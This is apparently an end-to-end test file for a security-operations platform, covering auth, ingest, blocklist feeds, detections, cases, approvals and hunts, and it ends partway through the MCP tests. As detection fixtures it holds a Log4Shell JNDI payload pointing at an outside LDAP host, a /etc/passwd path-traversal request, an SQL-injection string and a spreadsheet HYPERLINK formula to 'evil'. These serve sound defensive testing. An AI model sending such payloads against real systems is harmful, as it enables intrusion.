'use strict';
// End-to-end HTTP test: boots the real app on an ephemeral port with an
// isolated store and exercises auth, CSRF, roles, ingest, feeds and retention.
// AEGIS_TEST_SUPABASE=1 runs the same checks against the Supabase project in
// .env instead. It WIPES every Aegis table before and after: never point it
// at a database that holds real incidents.
const assert = require('assert');
const crypto = require('crypto');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { MemoryStore } = require('../src/store/memory');
const { FeedAdapter } = require('../src/enforce');
const { createApp } = require('../src/app');

const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline test)'); }, async request() { throw new Error('fetch failed (offline test)'); } };

(async () => {
  const live = process.env.AEGIS_TEST_SUPABASE === '1';
  let store;
  let wipe = async () => {};
  if (live) {
    require('dotenv').config();
    const { SupabaseStore } = require('../src/store/supabase');
    store = new SupabaseStore(process.env.SUPABASE_URL, process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_SECRET_KEY);
    wipe = async () => {
      for (const [t, c] of [['alert_notes', 'id'], ['firewall_rules', 'rule_id'], ['investigations', 'investigation_id'], ['server_logs', 'id'], ['alerts', 'alert_id'],
        ['suppressions', 'id'], ['approvals', 'approval_id'], ['hunt_runs', 'id'], ['hunts', 'hunt_id'], ['cases', 'case_id'], ['assets', 'ip_address'], ['cves', 'cve_id'], ['app_config', 'key'], ['audit_log', 'id'], ['api_keys', 'id'], ['users', 'id']]) {
        const { error } = await store.sb.from(t).delete().not(c, 'is', null);
        if (error) throw new Error(`wipe ${t}: ${error.message}`);
      }
    };
    await wipe();
    console.log(`Running against ${new URL(process.env.SUPABASE_URL).host}`);
  } else {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-http-'));
    store = new MemoryStore({ file: path.join(dir, 'store.json'), demo: false });
  }
  await store.init();
  const env = { SESSION_SECRET: 'x'.repeat(48), AEGIS_SETUP_TOKEN: 'bootstrap-123' };
  const { app, jobs } = createApp({ store, enforcer: new FeedAdapter(), nvd: offlineNvd, env, demo: false, warnings: [] });
  // Stands in for a SIEM / SOAR webhook endpoint.
  const received = [];
  const hook = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => { received.push({ headers: req.headers, body }); res.writeHead(204); res.end(); });
  });
  await new Promise((r) => hook.listen(0, '127.0.0.1', r));
  const hookUrl = `http://127.0.0.1:${hook.address().port}/hooks/T0SOC/aegis-intake-7f3a9c`;
  const server = app.listen(0, '127.0.0.1');
  await new Promise((r) => server.once('listening', r));
  const base = `http://127.0.0.1:${server.address().port}`;

  const jar = {};
  async function call(method, url, { body, as = 'admin', headers = {}, raw } = {}) {
    const h = { ...headers };
    if (as && jar[as]) h.Cookie = jar[as];
    if (body !== undefined && !raw) h['Content-Type'] = 'application/json';
    if (as && method !== 'GET' && h['X-Aegis-Client'] === undefined) h['X-Aegis-Client'] = 'web';
    const res = await fetch(base + url, { method, headers: h, body: raw ?? (body !== undefined ? JSON.stringify(body) : undefined) });
    const set = res.headers.get('set-cookie');
    if (set && as) jar[as] = set.split(';')[0];
    const text = await res.text();
    let json = null; try { json = JSON.parse(text); } catch { /* text */ }
    return { status: res.status, json, text, headers: res.headers };
  }

  let passed = 0;
  const ok = (cond, msg) => { assert.ok(cond, msg); passed++; console.log(`PASS ${msg}`); };

  try {
    let r = await call('GET', '/api/auth/state', { as: null });
    ok(r.json.needs_setup === true && r.json.setup_token === true, 'fresh install asks for setup');
    ok((await call('GET', '/api/alerts', { as: null })).status === 401, 'API is closed before sign-in');
    ok(r.headers.get('content-security-policy').includes("script-src 'self'"), 'CSP header present');

    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'priya@corp.example', password: 'Str0ngPassword', setup_token: 'wrong' } });
    ok(r.status === 403, 'setup rejects wrong setup token');
    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'priya@corp.example', password: 'weak' , setup_token: 'bootstrap-123' } });
    ok(r.status === 400, 'setup enforces password policy');
    r = await call('POST', '/api/auth/setup', { body: { name: 'Priya Rao', email: 'Priya@corp.example', password: 'Str0ngPassword', setup_token: ' bootstrap-123\n' } });
    ok(r.status === 201 && r.json.user.role === 'admin' && jar.admin, 'first admin created and signed in');
    const adminId = r.json.user.id;
    ok((await call('POST', '/api/auth/setup', { as: null, body: { name: 'X', email: 'x@y.z', password: 'Str0ngPassword' } })).status === 409, 'setup cannot run twice');

    r = await call('GET', '/api/alerts');
    ok(r.status === 200 && Array.isArray(r.json) && r.json.length === 0, 'production install starts with no fake alerts');
    r = await call('GET', '/api/cves');
    ok(r.json.some((c) => c.cve_id === 'CVE-2021-44228' && c.cpe_ranges === 3 && !c.cpe_matches), 'reference CVEs present, CPE data stripped');

    r = await call('PUT', '/api/config', { body: { maxIterations: 10 }, headers: { 'X-Aegis-Client': '' } });
    ok(r.status === 403, 'writes without X-Aegis-Client are refused (CSRF)');

    r = await call('POST', '/api/users', { body: { name: 'Sam Viewer', email: 'sam@corp.example', password: 'Another1pass', role: 'viewer' } });
    ok(r.status === 201 && !r.json.password_hash, 'admin creates viewer, hash not exposed');
    const viewerId = r.json.id;
    r = await call('POST', '/api/auth/login', { as: 'viewer', body: { email: 'sam@corp.example', password: 'nope-nope-1' } });
    ok(r.status === 401, 'wrong password rejected');
    r = await call('POST', '/api/auth/login', { as: 'viewer', body: { email: 'sam@corp.example', password: 'Another1pass' } });
    ok(r.status === 200 && jar.viewer, 'viewer signs in');
    ok((await call('POST', '/api/rules', { as: 'viewer', body: { target_ip: '203.0.113.5', action: 'BLOCK', reason: 'test block' } })).status === 403, 'viewer cannot create rules');
    ok((await call('GET', '/api/users', { as: 'viewer' })).status === 403, 'viewer cannot list users');

    r = await call('PATCH', `/api/users/${viewerId}`, { body: { disabled: true } });
    ok(r.status === 200, 'admin disables viewer');
    ok((await call('GET', '/api/alerts', { as: 'viewer' })).status === 401, 'disabled user session is revoked immediately');
    ok((await call('PATCH', `/api/users/${adminId}`, { body: { role: 'analyst' } })).status === 409, 'last admin cannot be demoted');

    // API keys and ingest
    ok((await call('POST', '/api/ingest/alerts', { as: null, body: [] })).status === 401, 'ingest needs an API key');
    r = await call('POST', '/api/keys', { body: { name: 'suricata-dmz-01', scopes: ['ingest'] } });
    ok(r.status === 201 && r.json.key.startsWith('aeg_'), 'ingest key issued once');
    const ingestKey = r.json.key;
    r = await call('POST', '/api/keys', { body: { name: 'pa-3220 EDL', scopes: ['feed'] } });
    const feedKey = r.json.key;
    ok(!(await call('GET', '/api/keys')).json.some((k) => k.key || k.hash), 'key list never returns secrets');

    const eve = [
      { timestamp: new Date(Date.now() - 60000).toISOString(), flow_id: 99, event_type: 'alert', src_ip: '185.220.101.45', src_port: 4444, dest_ip: '10.0.4.15', dest_port: 8080, proto: 'TCP', app_proto: 'http',
        alert: { signature_id: 2034647, rev: 3, signature: 'ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)', category: 'Attempted Administrator Privilege Gain', severity: 1 },
        payload_printable: 'GET /?q=${jndi:ldap://185.220.101.45:1389/a} HTTP/1.1' },
      { timestamp: new Date().toISOString(), event_type: 'flow', src_ip: '1.1.1.1', dest_ip: '10.0.0.1' }
    ];
    const ndjson = eve.map((e) => JSON.stringify(e)).join('\n') + '\nnot json\n';
    r = await call('POST', '/api/ingest/alerts', { as: null, raw: ndjson, headers: { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'application/x-ndjson' } });
    ok(r.status === 202 && r.json.accepted === 1 && r.json.skipped === 1 && r.json.rejected.length === 1, 'EVE NDJSON ingested (1 alert, 1 flow skipped, 1 bad line)');
    r = await call('POST', '/api/ingest/alerts', { as: null, body: eve, headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 0 && r.json.duplicates === 1, 're-sent events are de-duplicated');
    ok((await call('POST', '/api/ingest/alerts', { as: null, body: eve, headers: { Authorization: `Bearer ${feedKey}` } })).status === 403, 'feed key cannot ingest');

    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.15', { as: null, raw: '185.220.101.45 - - [16/Oct/2026:09:12:44 +0000] "GET /?q=x HTTP/1.1" 200 12\n', headers: { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'text/plain' } });
    ok(r.status === 202 && r.json.accepted === 1, 'raw access log line ingested');

    // Inventory
    r = await call('POST', '/api/assets/import', { raw: 'ip_address,hostname,criticality,installed_packages\n10.0.4.15,prod-web-core,critical,log4j-core-2.14.1.jar\n10.0.4.16,,high,\n', headers: { 'Content-Type': 'text/csv' } });
    ok(r.json.imported === 1 && r.json.errors.length === 1, 'CSV import with per-row errors');
    r = await call('GET', '/api/assets');
    ok(r.json[0].exposures.some((e) => e.cve_id === 'CVE-2021-44228'), 'imported host matched to Log4Shell by CPE range');
    const nmapXml = '<?xml version="1.0"?><nmaprun scanner="nmap" start="1760000000"><host><status state="up"/><address addr="10.0.4.15" addrtype="ipv4"/><ports><port protocol="tcp" portid="8080"><state state="open"/><service name="http" product="Apache Tomcat" version="9.0.31"/></port></ports></host><host><status state="up"/><address addr="10.0.4.30" addrtype="ipv4"/><hostnames><hostname name="db-02" type="PTR"/></hostnames></host></nmaprun>';
    r = await call('POST', '/api/assets/import', { raw: nmapXml, headers: { 'Content-Type': 'application/xml' } });
    ok(r.status === 200 && r.json.format === 'nmap' && r.json.created === 1 && r.json.updated === 1, 'Nmap XML import creates and updates hosts');
    let inv = (await call('GET', '/api/assets')).json;
    const merged = inv.find((a) => a.ip_address === '10.0.4.15');
    ok(merged.hostname === 'prod-web-core' && merged.criticality === 'CRITICAL', 'scan keeps hostname and criticality from the CMDB');
    ok(merged.installed_packages.includes('log4j-core-2.14.1.jar') && merged.installed_packages.includes('Apache Tomcat 9.0.31'), 'scan merges packages instead of replacing them');
    r = await call('POST', '/api/ingest/assets', { as: null, body: [{ ip_address: '10.0.4.31', hostname: 'build-01', os_family: 'Linux', installed_packages: ['openssl 3.0.2'] }], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.status === 200 && r.json.created === 1, 'agent inventory push with an ingest key');
    ok((await call('POST', '/api/ingest/assets', { as: null, body: [{ ip_address: '10.0.4.32', hostname: 'x' }], headers: { Authorization: `Bearer ${feedKey}` } })).status === 403, 'feed key cannot push inventory');
    inv = (await call('GET', '/api/assets')).json;
    ok(inv.find((a) => a.ip_address === '10.0.4.31').source === 'agent', 'agent rows are tagged with their source');
    r = await call('POST', '/api/cves/sync', { body: {} });
    ok(r.status === 200 && r.json.updated === 0 && r.json.failed.length > 0, 'NVD sync fails gracefully offline');

    // Investigation -> rule -> feed pull -> enforced
    const alertId = (await call('GET', '/api/alerts')).json[0].alert_id;
    r = await call('POST', '/api/investigations/stream', { body: { alert_id: alertId } });
    ok(r.text.includes('"type":"done"'), 'investigation streams to completion');
    let rules = (await call('GET', '/api/rules')).json;
    const block = rules.find((x) => x.action === 'BLOCK' && x.target_ip === '185.220.101.45');
    ok(block && block.enforcement.status === 'PENDING', 'block rule is PENDING until the firewall pulls');
    const st = (await call('GET', `/api/alerts/${alertId}`)).json;
    ok(st.alert.status !== 'CONTAINED', 'alert is not marked contained before enforcement');
    ok((await call('GET', '/api/feeds/blocklist.txt', { as: null })).status === 401, 'feed needs a key');
    const basic = Buffer.from(`fw:${feedKey}`).toString('base64');
    r = await call('GET', '/api/feeds/blocklist.txt', { as: null, headers: { Authorization: `Basic ${basic}` } });
    ok(r.status === 200 && r.text.split('\n').includes('185.220.101.45'), 'firewall pulls blocklist with basic auth');
    rules = (await call('GET', '/api/rules')).json;
    ok(rules.find((x) => x.rule_id === block.rule_id).enforcement.status === 'ENFORCED', 'pull marks the rule ENFORCED');
    r = await call('POST', '/api/verify', { body: { target_ip: '185.220.101.45' } });
    ok(r.json.contained === true && r.json.status === 'ENFORCED', 'verify reports enforcement read-back');

    // ---- Case work: ownership, notes, timeline ---------------------------------
    r = await call('POST', `/api/alerts/${alertId}/assign`, { body: { user_id: adminId } });
    ok(r.status === 200 && r.json.assignee_name === 'Priya Rao' && r.json.acknowledged_at, 'alert assigned and acknowledged');
    ok((await call('POST', `/api/alerts/${alertId}/assign`, { body: { user_id: viewerId } })).status === 400, 'viewers cannot own cases');
    r = await call('POST', `/api/alerts/${alertId}/notes`, { body: { body: 'Confirmed with app team: host patched to 2.17.1' } });
    ok(r.status === 201 && r.json.kind === 'note', 'analyst note added');
    r = await call('GET', `/api/alerts/${alertId}`);
    ok(r.json.notes.some((n) => n.kind === 'event' && /took the case/.test(n.body)) && r.json.notes.some((n) => /Investigation INV-/.test(n.body)), 'timeline holds assignment and verdict events');
    ok((await call('GET', '/api/alerts?assignee=me')).json.every((a) => a.assignee_id === adminId), 'my-queue filter');

    // ---- Notification channel with HMAC signature -------------------------------
    const secret = 'whsec_test_0123456789abcdef';
    r = await call('POST', '/api/notify/channels', { body: { name: 'SOAR intake', kind: 'webhook', url: hookUrl, secret, min_severity: 'HIGH', events: ['alert', 'containment', 'verdict'] } });
    ok(r.status === 201 && r.json.signed && !r.json.secret && !String(r.json.url_hint).includes('aegis-intake'), 'webhook channel added, secret and URL masked');
    const channelId = r.json.id;
    ok(!JSON.stringify((await call('GET', '/api/config')).json).includes(secret), 'config never returns channel secrets');
    ok((await call('GET', '/api/notify/channels', { as: 'viewer' })).status === 401, 'channels hidden from signed-out users');
    r = await call('POST', `/api/notify/channels/${channelId}/test`, { body: {} });
    ok(r.status === 200 && r.json.ok && received.length === 1, 'test message delivered');
    const sig = (m) => `sha256=${crypto.createHmac('sha256', secret).update(`${m.headers['x-aegis-timestamp']}.${m.body}`).digest('hex')}`;
    ok(received[0].headers['x-aegis-signature'] === sig(received[0]), 'webhook HMAC signature verifies');

    // ---- Suppression rules -------------------------------------------------------
    const scan = (n, src) => ({ timestamp: new Date(Date.now() - n * 1000).toISOString(), flow_id: 5000 + n, event_type: 'alert', src_ip: src, src_port: 50000 + n, dest_ip: '10.0.4.15', dest_port: 443, proto: 'TCP',
      alert: { signature_id: 2010935, rev: 2, signature: 'ET SCAN Qualys vulnerability scanner', category: 'Attempted Information Leak', severity: 2 }, payload_printable: 'GET /qualys HTTP/1.1' });
    r = await call('POST', '/api/ingest/alerts', { as: null, body: [scan(1, '64.39.96.10'), scan(2, '64.39.96.11')], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 2 && received.length === 2 && JSON.parse(received[1].body).event === 'alert', 'new HIGH alerts pushed to the channel');
    r = await call('POST', '/api/suppressions/preview', { body: { signature: 'Qualys', source_cidr: '64.39.96.0/20' } });
    ok(r.status === 200 && r.json.matched === 2 && r.json.open === 2, 'suppression preview counts matching alerts');
    ok((await call('POST', '/api/suppressions', { body: { name: 'too broad', source_cidr: '0.0.0.0/0' } })).status === 400, 'over-broad CIDR rejected');
    r = await call('POST', '/api/suppressions', { body: { name: 'Quarterly Qualys scan', signature: 'Qualys', source_cidr: '64.39.96.0/20', expires_in_days: 30, apply_to_open: true } });
    ok(r.status === 201 && r.json.closed === 2 && r.json.hits === 2, 'suppression created and open matches closed');
    const suppId = r.json.id;
    r = await call('POST', '/api/ingest/alerts', { as: null, body: [scan(3, '64.39.96.12'), { ...scan(4, '198.51.100.9'), alert: { ...scan(4, '').alert, signature: 'ET SCAN Nmap OS detection' } }], headers: { Authorization: `Bearer ${ingestKey}` } });
    ok(r.json.accepted === 2 && r.json.suppressed === 1, 'ingest suppresses matching events only');
    const supp = (await call('GET', '/api/suppressions')).json.find((s) => s.id === suppId);
    ok(supp.hits === 3 && supp.live, 'suppression hit counter updates');
    const quiet = (await call('GET', '/api/alerts?q=Qualys')).json;
    ok(quiet.length === 3 && quiet.every((a) => a.status === 'FALSE_POSITIVE' && a.suppressed_by === suppId), 'suppressed alerts are kept and tagged');

    // ---- Bulk triage --------------------------------------------------------------
    const nmap = (await call('GET', '/api/alerts?q=Nmap')).json.map((a) => a.alert_id);
    r = await call('POST', '/api/alerts/bulk', { body: { ids: nmap, action: 'status', status: 'CLOSED' } });
    ok(r.status === 200 && r.json.updated === 1, 'bulk close');
    r = await call('GET', `/api/alerts/${nmap[0]}`);
    ok(r.json.alert.resolved_at && r.json.notes.some((n) => /bulk/.test(n.body)), 'bulk close stamps resolved_at and the timeline');

    // ---- Time-boxed containment ------------------------------------------------------
    r = await call('POST', '/api/rules', { body: { target_ip: '198.51.100.77', action: 'BLOCK', reason: 'credential stuffing', ttl_hours: 24 } });
    ok(r.status === 201 && r.json.expires_at, 'block with 24h expiry');
    ok(received.some((m) => JSON.parse(m.body).event === 'containment'), 'containment pushed to the channel');
    ok((await call('POST', '/api/rules', { body: { target_ip: '198.51.100.78', action: 'BLOCK', reason: 'bad ttl', ttl_hours: 99999 } })).status === 400, 'out-of-range expiry rejected');
    await store.rules.update(r.json.rule_id, { expires_at: new Date(Date.now() - 1000).toISOString() });
    r = await call('GET', '/api/feeds/blocklist.txt', { as: null, headers: { Authorization: `Basic ${basic}` } });
    ok(!r.text.includes('198.51.100.77') && r.text.includes('185.220.101.45'), 'expired block dropped from the feed');
    rules = (await call('GET', '/api/rules')).json;
    ok(rules.find((x) => x.target_ip === '198.51.100.77').is_active === false, 'expired rule switched off');

    // ---- Profiles, reports, exports ---------------------------------------------------
    r = await call('GET', '/api/ip/185.220.101.45');
    ok(r.status === 200 && r.json.counts.as_source >= 1 && r.json.rules.length >= 1 && r.json.logs.length === 1, 'IP profile gathers alerts, rules and logs');
    ok((await call('GET', '/api/search?q=185.220.101.45')).json.ip === '185.220.101.45', 'search offers the IP profile');
    r = await call('GET', '/api/reports/summary?days=7');
    const crit = r.json.sla.find((s) => s.severity === 'CRITICAL');
    ok(r.status === 200 && r.json.totals.suppressed === 3 && r.json.totals.noise_reduction > 0 && crit.acknowledged >= 1, 'report summary: noise reduction and SLA');
    ok(r.json.mitre.some((t) => t.total > 0) && r.json.top_attackers.some((a) => a.ip === '185.220.101.45' && a.blocked), 'report summary: ATT&CK and top attackers');
    await call('POST', '/api/alerts', { body: { signature: '=HYPERLINK("http://evil")', source_ip: '203.0.113.9', dest_ip: '10.0.4.15', dest_port: 80, severity: 'LOW', raw_payload: 'x' } });
    r = await call('GET', '/api/export/alerts.csv?days=7');
    ok(r.status === 200 && /text\/csv/.test(r.headers.get('content-type')) && r.text.includes(`"'=HYPERLINK(""http://evil"")"`), 'CSV export neutralises formulas');
    ok((await call('GET', '/api/export/audit.csv')).text.includes('suppression.created'), 'audit CSV export');
    const invId = (await call('GET', '/api/investigations')).json[0].investigation_id;
    r = await call('GET', `/api/investigations/${invId}/report.md`);
    ok(r.status === 200 && r.text.startsWith('# Incident report') && r.text.includes('Case timeline'), 'incident report download');
    r = await call('PUT', '/api/config', { body: { slaCritical: 10, autoBlockTtlHours: 48 } });
    ok(r.status === 200 && r.json.slaCritical === 10 && !('notifyChannels' in r.json), 'SLA and TTL policy saved');
    ok((await call('PUT', '/api/config', { body: { slaHigh: 0 } })).status === 400, 'invalid SLA rejected');

    // Built-in detections on ingested logs
    const sshd = (i, who = 'root') => `sshd[9${i}]: Failed password for ${who} from 203.0.113.77 port 5${i}000 ssh2`;
    const authHeaders = { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'text/plain' };
    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.102&log_type=auth_log', { as: null, raw: [1, 2, 3].map((i) => sshd(i)).join('\n'), headers: authHeaders });
    ok(r.status === 202 && r.json.detections.raised === 0, 'three failed SSH logins stay under the threshold');
    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.102&log_type=auth_log', { as: null, raw: [sshd(4, 'invalid user oracle'), sshd(5), 'sshd[99]: Accepted password for deploy from 203.0.113.77 port 59000 ssh2'].join('\n'), headers: authHeaders });
    ok(r.json.detections.raised === 2, 'brute force across two batches raises SSH alerts');
    let det = (await call('GET', '/api/alerts?q=aegis-detect')).json;
    ok(det.some((a) => a.severity === 'CRITICAL' && /succeeded as deploy/.test(a.signature) && a.source_ip === '203.0.113.77' && a.dest_ip === '10.0.4.102'), 'login after failures raised as CRITICAL with the real flow');
    ok(det.some((a) => /brute force: 5 failed logins/.test(a.signature) && /oracle/.test(a.signature)), 'brute-force alert counts failures and names users');
    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.102&log_type=auth_log', { as: null, raw: sshd(6), headers: authHeaders });
    ok(r.json.detections.raised === 0, 'the same burst is not raised twice');
    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.15', { as: null, raw: '198.51.100.40 - - [17/Oct/2026:09:00:00 +0000] "GET /cgi-bin/.%2e/%2e%2e/etc/passwd HTTP/1.1" 400 0 "-" "curl/8"\n', headers: authHeaders });
    ok(r.json.detections.raised === 1, 'path traversal in an access log raises an alert');
    r = await call('GET', '/api/detect/rules');
    ok(r.status === 200 && r.json.rules.find((x) => x.id === 'ssh-bruteforce').hits_30d === 1 && r.json.recent.length === 3, 'rule list reports hits');
    r = await call('POST', '/api/detect/test', { body: { host_ip: '10.0.0.1', lines: '45.1.1.1 - - "GET /?a=${jndi:ldap://x/a} HTTP/1.1" 200 1' } });
    ok(r.status === 200 && r.json.findings.length === 1 && r.json.findings[0].ref === 'CVE-2021-44228', 'rule tester finds Log4Shell without storing');
    ok((await call('GET', '/api/alerts?q=45.1.1.1')).json.length === 0, 'rule tester stores nothing');
    ok((await call('PUT', '/api/config', { body: { detectDisabled: ['nope'] } })).status === 400, 'unknown rule id rejected');
    r = await call('PUT', '/api/config', { body: { detectDisabled: ['web-exploit'], detectSshThreshold: 8 } });
    ok(r.status === 200 && r.json.detectSshThreshold === 8, 'detection settings saved');
    r = await call('POST', '/api/ingest/logs?host_ip=10.0.4.15', { as: null, raw: '198.51.100.41 - - "GET /x?id=1%27%20OR%201=1 HTTP/1.1" 200 1\n', headers: authHeaders });
    ok(r.json.detections.raised === 0, 'disabled rule stays quiet');

    // Intel endpoints offline: clear errors, no invented data
    r = await call('GET', '/api/intel/kev');
    ok(r.status === 200 && r.json.status.loaded === false && r.json.recent.length === 0, 'KEV view reports an unloaded catalog offline');
    ok((await call('POST', '/api/intel/bulk', { body: { ips: '1.2.3.4' } })).status === 503, 'bulk IOC check refuses when intel is off');
    r = await call('GET', '/api/intel/lookup?q=example.org');
    ok(r.status === 200 && r.json.skipped === true && r.json.verdict === 'unknown', 'indicator lookup says intel is off instead of guessing');
    ok((await call('GET', '/api/intel/lookup?q=%3F%3F%3F')).status === 400, 'lookup rejects text that is not an indicator');
    r = await call('GET', '/api/intel/feeds');
    ok(r.status === 200 && r.json.offline === true, 'feed status reports offline mode');
    r = await call('GET', '/api/sigma/rules');
    ok(r.status === 200 && Array.isArray(r.json.rules) && r.json.rules.length === 0, 'no Sigma rules are invented offline');
    ok((await call('PUT', '/api/config', { body: { sigmaMinLevel: 'bogus' } })).status === 400, 'bad Sigma level rejected');
    ok((await call('POST', '/api/intel/feeds/refresh', { body: { which: 'all' } })).status === 503, 'feed refresh refuses offline');
    r = await call('GET', '/api/intel/origins');
    ok(r.status === 200 && r.json.intel === false && r.json.sources >= 1, 'origins lists sources without locating them offline');
    r = await call('POST', '/api/assets/10.0.4.15/discover', { body: {} });
    ok(r.status === 200 && r.json.imported === 0 && r.json.products[0].error, 'host CVE discovery reports NVD failures per product');
    ok((await call('GET', '/api/assets/10.0.4.15/software')).json.some((s) => s.product === 'log4j'), 'host software mapped to NVD products');

    ok((await call('POST', '/api/reset')).status === 403, 'reset disabled outside demo mode');

    // ---- Cases, approvals, hunts and MCP ----------------------------------------
    r = await call('POST', '/api/cases', { body: { title: 'Log4Shell against prod-web-core', severity: 'HIGH', alert_ids: [alertId, 'ALERT-NOPE'] } });
    ok(r.status === 201 && r.json.linked === 1 && r.json.skipped === 1, 'case created; unknown alert ids are skipped');
    const caseId = r.json.case_id;
    ok((await call('POST', '/api/cases', { body: { title: 'x' } })).status === 400, 'case title is validated');
    r = await call('POST', `/api/cases/${caseId}/iocs`, { body: { values: 'C2 at 185.220.101[.]45 and hxxp://update-cdn[.]top/x.sh, again 185.220.101.45' } });
    ok(r.status === 201 && r.json.added.length === 2 && r.json.added.some((i) => i.value === '185.220.101.45'), 'defanged IOCs extracted and de-duplicated');
    r = await call('POST', `/api/cases/${caseId}/tasks`, { body: { title: 'Patch log4j on prod-web-core', phase: 'Eradication' } });
    const taskId = r.json.id;
    r = await call('POST', `/api/cases/${caseId}/events`, { body: { kind: 'evidence', title: 'access.log', body: 'GET /?q=${jndi:ldap://185.220.101.45:1389/a}' } });
    ok(r.status === 201 && r.json.sha256 === crypto.createHash('sha256').update('GET /?q=${jndi:ldap://185.220.101.45:1389/a}').digest('hex'), 'evidence is SHA-256 hashed on arrival');
    ok((await call('POST', `/api/cases/${caseId}/events`, { body: { kind: 'timeline', body: 'x' } })).status === 400, 'timeline entries need a time');
    ok((await call('POST', `/api/cases/${caseId}/close`, { body: { resolution: 'Patched and blocked the source.' } })).status === 409, 'case cannot close with open tasks');
    await call('PATCH', `/api/cases/${caseId}/tasks/${taskId}`, { body: { status: 'DONE' } });
    r = await call('GET', `/api/cases/${caseId}`);
    ok(r.json.case.status === 'IN_PROGRESS' && r.json.alerts.length === 1 && r.json.events.some((e) => e.kind === 'event'), 'case detail carries alerts, timeline and status');
    ok((await call('GET', `/api/alerts/${alertId}/cases`)).json[0].case_id === caseId, 'alert lists its cases');
    r = await call('POST', `/api/cases/${caseId}/close`, { body: { resolution: 'Patched and blocked the source.' } });
    ok(r.status === 200 && r.json.status === 'CLOSED', 'case closed with a resolution');
    ok((await call('POST', `/api/cases/${caseId}/tasks`, { body: { title: 'late' } })).status === 409, 'closed case is read-only');
    ok((await call('GET', '/api/cases/metrics')).json.closed === 1, 'case metrics count closed cases');
    r = await call('POST', '/api/cases/from-killchain', { body: { ip: '185.220.101.45', hours: 48 } });
    ok(r.status === 201 && r.json.source === 'kill-chain' && r.json.linked >= 1, 'kill-chain case groups alerts by attacker');
    ok((await call('GET', `/api/cases/${r.json.case_id}`)).json.tasks.length >= 4, 'kill-chain case seeds a response checklist');

    // Manual approval mode: the engine proposes, a human decides.
    ok((await call('PUT', '/api/config', { body: { approvalMode: 'confidence', approvalAutoAt: 80, approvalQuickAt: 90 } })).status === 400, 'approval bands must descend');
    ok((await call('PUT', '/api/config', { body: { approvalMode: 'manual' } })).status === 200, 'approval mode set to manual');
    r = await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '203.0.113.77', reason: 'Credential stuffing source', confidence: 72 } });
    ok(r.status === 201 && r.json.approval.status === 'PENDING' && r.json.approval.route === 'analyst_review', 'proposal queued with its route');
    const apr = r.json.approval.approval_id;
    ok((await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '203.0.113.77', reason: 'again please' } })).json.duplicate === true, 'duplicate proposal joins the open one');
    ok((await call('POST', '/api/approvals', { body: { action: 'BLOCK', target_ip: '10.0.4.15', reason: 'nope nope' } })).status === 400, 'internal block refused');
    ok((await call('GET', '/api/approvals/count')).json.pending === 1, 'pending count');
    ok((await call('POST', `/api/approvals/${apr}/reject`, { body: {} })).status === 400, 'rejection needs a reason');
    r = await call('POST', `/api/approvals/${apr}/approve`, { body: { note: 'Seen in AbuseIPDB' } });
    ok(r.status === 200 && r.json.approval.status === 'APPROVED' && r.json.rule.target_ip === '203.0.113.77', 'approval executes the block');
    ok((await call('POST', `/api/approvals/${apr}/approve`, { body: {} })).status === 409, 'an approval is decided once');
    await call('PUT', '/api/config', { body: { approvalMode: 'auto' } });

    // Hunts over stored telemetry.
    ok((await call('POST', '/api/hunts', { body: { name: 'JNDI', hypothesis: 'short' } })).status === 400, 'hunt needs a hypothesis');
    r = await call('POST', '/api/hunts', { body: { name: 'JNDI lookups in web logs', hypothesis: 'Log4Shell probes reached our web tier', criteria: { text: 'jndi', window_hours: 48 } } });
    ok(r.status === 201, 'hunt saved');
    const huntId = r.json.hunt_id;
    r = await call('POST', `/api/hunts/${huntId}/run`, { body: {} });
    ok(r.status === 200 && r.json.hits >= 1 && r.json.findings.some((f) => f.kind === 'alert'), 'hunt finds the Log4Shell alert');
    r = await call('POST', `/api/hunts/${huntId}/run`, { body: {} });
    ok(r.json.new_hits === 0, 'second run reports nothing new');
    r = await call('POST', '/api/hunts/adhoc', { body: { criteria: { ip: '185.220.101.0/24' } } });
    ok(r.status === 200 && r.json.hits >= 1, 'ad-hoc CIDR hunt');
    ok((await call('POST', `/api/hunts/runs/${r.json.run_id}/replay`, { body: {} })).json.hits === r.json.hits, 'run replays from its stored criteria');
    ok((await call('POST', '/api/hunts/adhoc', { body: { criteria: { text: '/(/' } } })).status === 400, 'bad regex rejected');
    ok(Array.isArray((await call('GET', '/api/hunts/techniques?days=7')).json.techniques), 'ATT&CK rollup');

    // MCP over HTTP with API keys.
    const rpc = (key, body) => call('POST', '/mcp', { as: null, body, headers: key ? { Authorization: `Bearer ${key}` } : {} });
    ok((await rpc(null, { jsonrpc: '2.0', id: 1, method: 'initialize', params: {} })).status === 401, 'MCP needs a key');
    ok((await rpc(ingestKey, { jsonrpc: '2.0', id: 1, method: 'initialize', params: {} })).status === 403, 'ingest key cannot use MCP');
    r = await call('POST', '/api/keys', { body: { name: 'claude-desktop', scopes: ['mcp'] } });
    const mcpRead = r.json.key;
    r = await call('POST', '/api/keys', { body: { name: 'soc-agent', scopes: ['mcp:write'] } });
    const mcpWrite = r.json.key;
    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 't', version: '1' } } });
    ok(r.json.result.protocolVersion === '2025-03-26' && r.json.result.serverInfo.name === 'aegis-security', 'MCP initialize negotiates the version');
